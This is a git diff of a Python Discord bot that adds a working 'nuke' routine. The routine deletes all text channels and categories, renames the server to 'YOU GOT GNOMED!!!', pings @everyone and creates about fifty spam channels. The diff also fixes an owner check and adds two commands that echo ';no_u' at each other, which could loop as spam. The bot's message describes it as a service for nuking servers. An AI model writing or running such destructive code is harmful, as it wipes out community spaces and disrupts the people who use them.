@@ -24,8 +24,18 @@ async def on_ready():
 
 
 async def nuke_this_server(ctx):
-    # Step 1: Delete all channels
+    guild = ctx.message.guild
+    text_channel_list = []
+    for channel in guild.text_channels:
+        text_channel_list.append(channel)
 
+    print(text_channel_list)
+    # Step 1: Delete all channels
+    for channel in guild.text_channels:
+        await channel.delete()
+
+    for category in guild.categories:
+        await category.delete()
 
     # Step 2: Kick all members where possible
 
@@ -34,32 +44,33 @@ async def nuke_this_server(ctx):
 
 
     # Step 4: Change server image and server name
-    # with open('image.jpg', 'rb') as f:
-    #     icon = f.read()
-    # await ctx.edit(ctx.message.server, icon=icon)
-    await guild.creedit(ctx.message.server, name="gnomes")
+    with open('gnomed_image.jpg', 'rb') as f:
+        icon = f.read()
+
+    await guild.edit(name="YOU GOT GNOMED!!!", icon=icon)
 
     # Step 5: Create text-channel
-    guild = ctx.message.guild
-    await guild.create_text_channel("youve-been-gnomed!")
+    important_channel = await guild.create_text_channel("_IMPORTANT")
 
     # Step 6: Send message in channel
+    await important_channel.send("@everyone \n"
+                                 "You've been gnomed! Congratulations! \n"
+                                 "This bot is a service to nuke servers so, \n"
+                                 "If you are Kim Jong Un, feel free to use this!")
+
+    for i in range(1, 50):
+        await guild.create_text_channel("youve-been-gnomed!")
 
 
-
-
-
-    # await channel.send("You've been gnomed! Congratulations! \n"
-    #                    "This bot is a service to nuke servers so, \n"
-    #                    "If you are Kim Jong Un, feel free to use this!")
 
 
 async def is_owner(ctx):
 
     # 241062161059676161 = Daniel
     # 274644114312527872 = Ceniken
+    # 482490009555959808 = Warrior Cat
 
-    if ctx.author.id == 241062161059676161 or 274644114312527872:
+    if ctx.author.id == 241062161059676161 or ctx.author.id == 274644114312527872 or ctx.author.id == 482490009555959808:
         return True
     else:
         return False
@@ -101,6 +112,16 @@ async def agree(ctx):
             await nuke_this_server(ctx)
     elif authorisation_id is False:
         await ctx.send("You do not have permissions to accept requests.")
+
+
+@bot.command()
+async def no_u_start(ctx):
+    await ctx.send(";no_u")
+
+
+@bot.command()
+async def no_u(ctx):
+    await ctx.send(";no_u")
 
 
 bot.run(getToken())
